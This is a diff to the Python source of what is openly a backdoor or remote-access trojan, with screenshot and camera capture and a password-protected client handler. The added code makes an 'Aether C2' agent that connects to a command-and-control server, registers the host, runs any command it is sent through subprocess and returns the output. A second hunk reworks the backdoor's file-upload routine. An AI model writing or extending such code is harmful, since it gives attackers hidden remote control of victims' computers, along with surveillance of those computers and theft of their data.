@@ -15,6 +15,36 @@ from PIL import ImageGrab
 import cv2
 import requests
 import os
+import socketio
+import time
+import uuid
+import platform
+
+# --- Aether C2 Agent ---
+sio = socketio.Client()
+agent_id = f"agent-{uuid.uuid4().hex[:6]}"
+
+@sio.on('connect')
+def on_connect():
+    logging.info("Connected to Aether C2. Registering agent...")
+    sio.emit('register_agent', {
+        'id': agent_id,
+        'ip': '127.0.0.1', # This would be the public IP in a real scenario
+        'os': platform.system(),
+    })
+
+@sio.on('execute_command')
+def on_execute_command(data):
+    command = data['command']
+    logging.info(f"Received command from C2: {command}")
+    output = subprocess.getoutput(command)
+    sio.emit('command_output', {'agent_id': agent_id, 'output': output})
+
+def start_aether_agent(c2_server_url):
+    """Starts the agent that connects to the Aether C2 dashboard."""
+    sio.connect(c2_server_url)
+    sio.wait()
+
 
 def capture_screenshot():
     img = ImageGrab.grab()
@@ -76,14 +106,13 @@ def handle_client(client_socket, backdoor_password):
                     if not data_len_bytes:
                         break
                     data_len = int.from_bytes(data_len_bytes, 'big')
-                    data = b""
-                    while len(data) < data_len:
-                        packet = client_socket.recv(data_len - len(data))
-                        if not packet:
-                            break
-                        data += packet
                     with open(filepath, 'wb') as f:
-                        f.write(data)
+                        while data_len > 0:
+                            chunk = client_socket.recv(min(4096, data_len))
+                            if not chunk:
+                                break
+                            f.write(chunk)
+                            data_len -= len(chunk)
                     client_socket.send(encryptor.encrypt(b"File uploaded successfully."))
                 except Exception as e:
                     client_socket.send(encryptor.encrypt(f"Upload failed: {e}".encode()))
